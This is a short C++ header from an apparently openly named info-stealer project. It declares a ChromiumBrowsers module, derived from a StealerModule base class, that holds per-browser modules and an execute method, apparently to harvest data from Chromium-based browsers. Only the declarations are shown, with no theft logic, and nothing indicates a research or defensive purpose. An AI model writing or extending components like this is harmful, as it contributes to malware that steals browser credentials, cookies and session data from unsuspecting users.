//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CHROMIUMBROWSERS_H
#define STEALER_CHROMIUMBROWSERS_H


#include "../../../StealerModule.h"
#include "../BrowserModule.h"
#include "ChromiumBrowserModule.h"

class ChromiumBrowsers : public StealerModule {
public:
    ChromiumBrowsers();

    void execute(fs::path &root) override;
protected:
    std::list<ChromiumBrowserModule*> modules;
};


#endif //STEALER_CHROMIUMBROWSERS_H
